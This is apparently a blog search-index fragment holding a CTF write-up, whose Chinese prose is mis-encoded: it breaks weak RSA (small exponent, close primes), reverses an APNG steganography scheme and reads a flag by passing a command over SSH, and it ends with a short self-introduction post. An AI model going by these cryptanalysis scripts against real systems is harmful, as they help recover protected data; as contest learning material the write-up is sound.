---------<br>| Part 2: |<br> ---------<br> n = 21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419<br> e = 3<br> ct = 26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125<br> What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°åŠ å¯†æŒ‡æ•°eå¾ˆå°ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¼€æ–¹æ±‚è§£å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">0x3</span><br>n = <span class="hljs-number">21984385600649967782331863593924102436585066484191623195882222547673570244475780629687822167989708574426866726594728874805115343269798282457109572103808168717297643786879687407125835510708369369452066036081265495727817566573832554802942178842361272009775406486896598963082180982538712496148845771649987025233485619836564348850399478693602977813231635752371346486494990471592789061740477387129729970592609102941311866809610802313761260294058835607292101793124755896831042571976602987089357127373715869012159472398776658325559448411402063905089012465509274881162806001450685859679444595914638449991047584895744421268419</span><br>c = <span class="hljs-number">26480272848384180570411447917437668635135597564435407928130220812155801611065536704781892656033726277516148813916446180796750368332515779970289682282804676030149428215146347671350240386440440048832713595112882403831539777582778645411270433913301224819057222081543727263602678819745693540865806160910293144052079393615890645460901858988883318691997438568705602949652125</span><br><br>k = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    res = iroot(c + k * n, e)  <span class="hljs-comment"># c+k*n å¼€3æ¬¡æ–¹æ ¹ èƒ½å¼€3æ¬¡æ–¹å³å¯</span><br>    <span class="hljs-keyword">if</span> (res[<span class="hljs-number">1</span>] == <span class="hljs-literal">True</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>]))<br>        <span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(res[<span class="hljs-number">0</span>])))  <span class="hljs-comment"># è½¬ä¸ºå­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">break</span><br>    k = k + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æ‰“å°äº†æ•°å­—ä¹Ÿæ‰“å°äº†å­—ç¬¦ä¸²ï¼Œæ˜¯ä»æˆ‘ä¹‹å‰çš„ä»£ç ä¸Šæ”¹çš„ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"> ---------<br>| Part 3: |<br> ---------<br> q = p + 2<br>while !(isPrime(q)):<br>    q += 2<br>n = p*q<br>n = 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>e = 65537<br>ct = 20631059905657990621121472678172311137355898932087354262172309893885321498925560019065033573185005618575156342764326342253251212781095718707971251014407982342185739678572043698218123534431914415817339019215948120246829763194761668345794978860628612447418680047622373133912651452245133307912003452486642093319<br>What is the plaintext (in integer form)?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºäº†ä¸¤ä¸ªç´ æ•°ç”Ÿæˆçš„æ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªç´ æ•°åº”è¯¥æ˜¯æ¯”è¾ƒæ¥è¿‘çš„ã€‚</p><p>æ‰€ä»¥ç›´æ¥ç”¨yafuå°è¯•è¿›è¡Œåˆ†è§£ã€‚yafuæ¯”è¾ƒé€‚åˆè¿™ç§æƒ…å†µã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">fac: factoring 88881615737488301225985044439881905195398292505026841973979114989583620386889966196936383863573165224625895278832099461610638739494998960540693208136536764698022077924393297727577553457866191347931512435919295847354039191586621873435195696477610004925566087150861042148930517495281441139741545346918379251933<br>fac: using pretesting plan: normal<br>fac: no tune info: using qs/gnfs crossover of 95 digits<br>div: primes less than 10000<br>fmt: 1000000 iterations<br>Total factoring time = 0.6750 seconds<br><br><br>***factors found***<br><br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588379<br>P154 = 9427704690829486372323834254401690991535897190805758825455941539744129948703411885292076952568876153202122275131143524310245302189466786096848123870588327<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¾ˆå¿«å°±å‡ºç­”æ¡ˆäº†ã€‚è¿™æ ·på’Œqå°±åˆ†è§£å‡ºæ¥äº†ã€‚åé¢å°±æ˜¯å•çº¯çš„rsaè¿ç®—äº†ã€‚</p><p>åé¢è¿˜åšäº†ä¸€é“éšå†™</p><h1 id="ostrich"><a class="markdownIt-Anchor" href="#ostrich"></a> Ostrich</h1><p>ä¸€å…±ç»™äº†ä¸‰ä¸ªæ–‡ä»¶ã€‚</p><p>ä¸€å¼ å›¾ç‰‡ï¼Œä¸€ä¸ªç®—æ³•ï¼Œä¸€ä¸ªç»“æœã€‚</p><p>åº”è¯¥å¯¹ç®—æ³•è¿›è¡Œé€†å‘å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> imageio<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>filenames = []<br>flag = <span class="hljs-string">&quot;REDACTED&quot;</span> <br><br>orig_filename = <span class="hljs-string">&quot;ostrich.jpg&quot;</span><br>orig_image = Image.<span class="hljs-built_in">open</span>(orig_filename)<br>pixels = orig_image.load()<br>width, height = orig_image.size<br>images = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>    new_filename = <span class="hljs-string">f&#x27;./images/ostrich<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span><br>    new_image = Image.new(orig_image.mode, orig_image.size)<br>    new_pixels = new_image.load()<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            new_pixels[x,y] = orig_image.getpixel((x, y))<br><br>    x = random.randrange(<span class="hljs-number">0</span>,width)<br>    y = random.randrange(<span class="hljs-number">0</span>,height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br>    <span class="hljs-keyword">while</span>(pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>        x = random.randrange(<span class="hljs-number">0</span>,width)<br>        y = random.randrange(<span class="hljs-number">0</span>,height)<br>        pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>,width), random.randrange(<span class="hljs-number">0</span>,height))))<br>    <br>    new_val = l2b(pixel[<span class="hljs-number">2</span>]*<span class="hljs-built_in">ord</span>(flag[i]))<br>    pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>        pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br>    pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br><br>    new_pixels[x, y] = (pixel[<span class="hljs-number">0</span>], pixel[<span class="hljs-number">1</span>], pixel[<span class="hljs-number">2</span>])<br>    new_image.save(new_filename)<br>    filenames.append(new_filename)<br>    images.append(new_image)<br><br>APNG.from_files(filenames, delay=<span class="hljs-number">0</span>).save(<span class="hljs-string">&quot;result.apng&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>æœ€åä¿å­˜çš„æ˜¯ä¸€ä¸ªAPNGæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸ªåŠ¨å›¾æ–‡ä»¶ï¼Œä½†è¿™é‡Œä¸ä¼šåŠ¨å°±æ˜¯äº†ã€‚</p><p>å¤§è‡´æµç¨‹å…ˆçœ‹äº†ä¸€éã€‚æˆ‘ä»¬å…ˆæŠŠæ–‡ä»¶æå‡ºæ¥ï¼Œè¿™é‡Œçš„APNGåŠ¨å›¾ä¹Ÿæ˜¯å¤šå¹…å›¾ç‰‡åœ¨ä¸€èµ·æ„æˆçš„ã€‚æ¯å¼ å›¾ç‰‡é‡Œé¢åµŒå…¥äº†ä¸€ä¸ªå­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><br>img = APNG.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;result.apng&quot;</span>)<br><br><span class="hljs-keyword">for</span> i, (png, control) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(img.frames):<br>    png.save(<span class="hljs-string">&quot;./extract/&#123;i&#125;.png&quot;</span>.<span class="hljs-built_in">format</span>(i=i))<br></code></pre></td></tr></table></figure><p>ä¸€å…±æå–äº†38å¼ å›¾ç‰‡ã€‚</p><p>æ¥è®²ä¸€ä¸‹åµŒå…¥çš„æµç¨‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">x = random.randrange(<span class="hljs-number">0</span>, width)<br>y = random.randrange(<span class="hljs-number">0</span>, height)<br>pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((x, y)))<br><span class="hljs-keyword">while</span> (pixel[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>):<br>    x = random.randrange(<span class="hljs-number">0</span>, width)<br>    y = random.randrange(<span class="hljs-number">0</span>, height)<br>    pixel = <span class="hljs-built_in">list</span>(orig_image.getpixel((random.randrange(<span class="hljs-number">0</span>, width), random.randrange(<span class="hljs-number">0</span>, height))))<br></code></pre></td></tr></table></figure><p>æœ€ä¸»è¦çš„éƒ¨åˆ†åœ¨è¿™é‡Œã€‚</p><p>è¿™é‡Œè¦æ‰¾ä¸€ä¸ªBé€šé“å€¼ä¸ä¸º0çš„ç‚¹ã€‚åŸå§‹å›¾åƒä¸­æ‰¾ä¸€ä¸ªBé€šé“ä¸ä¸º0çš„ç‚¹ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„ç‚¹éƒ½ä¸å¯èƒ½Bé€šé“ä¸º0ï¼Œæ‰€ä»¥å…¶å®å°±æ˜¯éšæœºçš„åœ¨é‡Œé¢æ‰¾ä¸€ä¸ªç‚¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">new_val = l2b(pixel[<span class="hljs-number">2</span>] * <span class="hljs-built_in">ord</span>(flag[i]))<br> pixel[<span class="hljs-number">0</span>] = new_val[<span class="hljs-number">0</span>]<br> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(new_val) &gt; <span class="hljs-number">1</span>:<br>     pixel[<span class="hljs-number">1</span>] = new_val[<span class="hljs-number">1</span>]<br> pixel[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œé¢ï¼ŒåˆæŠŠæˆ‘ä»¬çš„å€¼æ”¹æˆäº†0ã€‚è¿™å°±è®©è¿™ä¸ªç‚¹å¾ˆå¥½æ‰¾äº†ã€‚ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°è¿™ä¸ªç‚¹ï¼Œè¯»å–è¿™ä¸ªç‚¹çš„åƒç´ å€¼ï¼Œç„¶åå’ŒåŸå§‹å›¾åƒçš„è¿™ä¸ªç‚¹åšè¿ç®—å°±å¯ä»¥å¾—åˆ°flagã€‚</p><p>åªè¦å’ŒåŸå›¾æ¯”è¾ƒå¤šäº†å“ªä¸€ä¸ªbé€šé“å€¼ä¸º0 çš„ç‚¹å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, GifImagePlugin<br><span class="hljs-keyword">from</span> apng <span class="hljs-keyword">import</span> APNG<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes <span class="hljs-keyword">as</span> l2b, bytes_to_long <span class="hljs-keyword">as</span> b2l<br><br>origin = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;ostrich.jpg&quot;</span>)<br>zero_dot = []<br>width, height = origin.size<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> origin.getpixel((x,y))[<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>            zero_dot.append((x,y))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">38</span>):<br>    current_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./extract/<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)<br>    width, height = current_img.size<br>    image = Image.new(current_img.mode, current_img.size)<br>    pixels = image.load()<br>    change_dot = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        <span class="hljs-keyword">if</span> change_dot <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>            pixels[x, y] = current_img.getpixel((x, y))<br>            <span class="hljs-keyword">if</span> pixels[x,y][<span class="hljs-number">2</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (x,y) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> zero_dot:<br>                    <span class="hljs-comment"># print(f&quot;&#123;i&#125; :&quot;,(x,y), &quot;is the change point&quot;)</span><br>                    change_dot = (x,y)<br><br>    origin_blue = origin.getpixel(change_dot)[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-comment"># åŸºæœ¬ä¸Šéƒ½ä¼šå‡ºç°ä¸¤ä¸ªå­—èŠ‚é•¿åº¦</span><br>    value = <span class="hljs-built_in">bytes</span>([current_img.getpixel(change_dot)[<span class="hljs-number">0</span>],current_img.getpixel(change_dot)[<span class="hljs-number">1</span>]])<br>    value = b2l(value)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(value//origin_blue), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯åé¢æ·»åŠ çš„ã€‚ï¼ˆ2022/05/03ï¼‰</p><h1 id="steam-locomotive"><a class="markdownIt-Anchor" href="#steam-locomotive"></a> Steam Locomotive</h1><p>è¿™é¢˜å¾ˆå¥½ç©ã€‚</p><p>ç”¨sshé“¾æ¥ç›®æ ‡æœåŠ¡å™¨ä¹‹åã€‚æ‰§è¡Œçš„æ˜¯SLè¿™ä¸ªå‘½ä»¤ï¼Œè€Œä¸”æ­¤æ—¶æˆ‘ä»¬ä¼šè¢«é˜»å¡æ— æ³•æ“ä½œã€‚</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><br><br>                      (  ) (@<span class="hljs-meta">@)</span> ( )  (<span class="hljs-meta">@)</span>  ()    @@    O     @     O     @      O<br>                 (@@<span class="hljs-meta">@)</span><br>             (    )<br>          (@@@<span class="hljs-meta">@)</span><br><br>        (   )<br>      ====        ________                ___________<br>  _D _|<span class="hljs-string">  </span>|<span class="hljs-string">_______/        \__I_I_____===__</span>|<span class="hljs-string">_________</span>|<br>   |<span class="hljs-string">(_)---  </span>|<span class="hljs-string">   H\________/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">        =</span>|<span class="hljs-string">___ ___</span>|<span class="hljs-string">      _________________</span><br><span class="hljs-string">   /     </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">  </span>|<span class="hljs-string">     </span>|<span class="hljs-string">   </span>|<span class="hljs-string">         </span>||<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>||<span class="hljs-string">     _</span>|<span class="hljs-string">                \_____A</span><br><span class="hljs-string">  </span>|<span class="hljs-string">      </span>|<span class="hljs-string">  </span>|<span class="hljs-string">   H  </span>|<span class="hljs-string">__--------------------</span>|<span class="hljs-string"> [___] </span>|<span class="hljs-string">   =</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string"> ________</span>|<span class="hljs-string">___H__/__</span>|<span class="hljs-string">_____/[][]~\_______</span>|<span class="hljs-string">       </span>|<span class="hljs-string">   -</span>|<span class="hljs-string">                        </span>|<br>  |<span class="hljs-string">/ </span>|<span class="hljs-string">   </span>|<span class="hljs-string">-----------I_____I [][] []  D   </span>|<span class="hljs-string">=======</span>|<span class="hljs-string">____</span>|<span class="hljs-string">________________________</span>|_<br>__/ =|<span class="hljs-string"> o </span>|<span class="hljs-string">=-~~\  /~~\  /~~\  /~~\ ____Y___________</span>|<span class="hljs-string">__</span>|<span class="hljs-string">__________________________</span>|_<br> |<span class="hljs-string">/-=</span>|<span class="hljs-string">___</span>|<span class="hljs-string">=O=====O=====O=====O   </span>|<span class="hljs-string">_____/~\___/          </span>|<span class="hljs-string">_D__D__D_</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_D__D__D_</span>|<br>  \_/      \__/  \__/  \__/  \__/      \_/               \_/   \_/    \_/   \_/<br><br><br><br></code></pre></td></tr></table></figure><p>ç«è½¦è·‘å®Œï¼Œè¿æ¥ä¹Ÿæ–­å¼€äº†ã€‚è¿™æ˜¯ä¸€é“ç®€å•é¢˜ï¼Œä½†æ˜¯æˆ‘çœŸçš„ä¸ä¼šåšã€‚åé¢çœ‹åˆ«äººçš„writeupæ‰çŸ¥é“ã€‚åŸæ¥sshè¿æ¥å¯ä»¥ç›´æ¥å¸¦å‘½ä»¤ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">ls</span><br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag.txt</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬è¿æ¥çš„æ—¶å€™ç›´æ¥å¸¦ä¸Šä¸€ä¸ªlså‘½ä»¤ã€‚ç»“æœæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªflagæ–‡ä»¶ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">C:\Users\lanpesk&gt;ssh <span class="hljs-literal">-p</span> <span class="hljs-number">31404</span> user@challenge.nahamcon.com <span class="hljs-built_in">cat</span> flag*<br>user@challenge.nahamcon.com<span class="hljs-string">&#x27;s password:</span><br><span class="hljs-string">flag&#123;4f9b10a81141c7a07a494c28bd91d05b&#125;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½åœ¨sshé˜»å¡çš„æƒ…å†µä¸‹æ‰§è¡Œå…¶ä»–å‘½ä»¤ã€‚ç®—æ˜¯å­¦åˆ°äº†ä¸€äº›å°çŸ¥è¯†ã€‚æˆ‘è§‰å¾—å¯ä»¥å‡ºåœ¨æˆ‘ä»¬å­¦æ ¡çš„æ–°ç”Ÿèµ›é‡Œé¢å˜¿å˜¿ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/04/28/hello-world/"/>
    <url>/2022/04/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to my blog! This post I will introduce myself.</p><span id="more"></span><h2 id="who-am-i"><a class="markdownIt-Anchor" href="#who-am-i"></a> Who am I</h2><p>å¤§å­¦ç”Ÿä¸€æšã€‚è®¡ç®—æœºç›¸å…³ä¸“ä¸šã€‚å¦‚æœæœ‰ä»€ä¹ˆé—®é¢˜æƒ³å’Œæˆ‘è®¨è®ºçš„è¯ï¼Œè¯·åˆ°githubæ‰¾æˆ‘æˆ–è€…é€šè¿‡ä»¥ä¸‹é‚®ç®±è”ç³»ï¼š</p><p><a href="mailto:professornameshou@gmail.com">professornameshou@gmail.com</a></p><h2 id="what-do-i-like"><a class="markdownIt-Anchor" href="#what-do-i-like"></a> What do I like</h2><p>å½“ç„¶æ˜¯ä»£ç å’¯ã€‚è¿˜æœ‰å„ç§æœ‰è¶£çš„é¡¹ç›®ã€‚æƒ³åšçš„äº‹æƒ…é‚£å¯çœŸæ˜¯å¤ªå¤šäº†ï¼Œä½†æœ‰æ—¶é—´æˆ‘éƒ½ä¼šä¸€ä¸€æ¥åšçš„ã€‚è¿˜æœ‰å„ç§æœ‰è¶£çš„æ¯”èµ›ï¼Œå½“ç„¶CTFä¹Ÿæ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚</p><p>ä»¥ä¸Šå°±æ˜¯æˆ‘çš„è‡ªè¿°å•¦ã€‚æœ‰ä»€ä¹ˆé—®é¢˜è¿˜è¯·é‚®ä»¶è”ç³»ï¼å¸Œæœ›æˆ‘çš„åšå®¢èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
